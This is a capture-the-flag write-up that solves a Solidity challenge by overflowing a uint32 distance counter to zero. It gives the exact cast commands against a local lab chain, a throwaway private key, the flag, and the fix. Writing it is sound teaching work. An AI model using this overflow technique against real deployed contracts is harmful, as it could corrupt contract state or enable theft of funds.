# Interstellar Write-up
## TL;DR
If you have noticed, the Solidity version used in this challenge is different than the other challenges, that's because Solidity versions < 0.8 had an infamous flaw in which an attacker could overflow (or underflow) `uint` variables to make it return to 0 (or to the maximum possible value in the case of underflow).
The goal of this challenge is to exploit an Integer Overflow vulnerability to set the `distanceTravled` attribute to 0.

## Solving the challenge
- `distanceTraveled` is `uint32` (4 bytes), and the largest number that we can represent with this number of bytes is `2^32 - 1 = 4294967295`
- `distanceTraveled` is initialized to `1337` , which means we need to add exactly `4294967295 - 1337 + 1 = 4294965959` in order to make it return to 0.

#### As usual, get the target address:
```bash
$cast call 0xEcf48fF5aA114A3636564Ea33E09748007f88159 "TARGET()" --rpc-url http://localhost:8545/907be6fc-c3e1-4582-9c13-a50b48af1246
0x000000000000000000000000ff57a663537c1bc2b544bf44c57e9dcc04713f0c
```
#### Call galacticBoost() with 4294965959:
```bash
$cast send 0xff57a663537c1bc2b544bf44c57e9dcc04713f0c "galacticBoost(uint32)" 4294965959 --rpc-url http://localhost:8545/907be6fc-c3e1-4582-9c13-a50b48af1246 --private-key 0xa35f722c76d175330a78708e4410d9e4ed8bf9e745e3fd7a1049d7d5883f6975
```
If you call `getDistanceTraveled()` now , you'll see that it's 0:
```bash
$cast call 0xff57a663537c1bc2b544bf44c57e9dcc04713f0c "getDistanceTraveled()" --rpc-url http://localhost:8545/907be6fc-c3e1-4582-9c13-a50b48af1246
0x0000000000000000000000000000000000000000000000000000000000000000
```
You're ready now to get the flag.

### Note:
The check used in the `SpaceShip` contract to prevent integer overflows is insecure: 
```solidity
require(distanceTraveled + advanceWithDistance < distanceFromTheBlackHole);
```
If we add a value that will overflow the `distanceTraveled` variable, `distanceTraveled + advanceWithDistance` will return a value smaller than `distanceFromTheBlackHole` anyways (`distanceFromTheBlackHole` is the maximum valur for uint32), and the require statement will pass.
To fix integer overflows/underflows in Solidity < 0.8 you need to use the SafeMath library from Openzeppelin, but the most effective way remains updating your Solidity version to > 0.8 as the compiler handles it automatically.
## Flag
`shellmates{1nt3g3R_0v3rfl0o0W_1s_4_Bl0o0o0cKk_H0o0l3}`

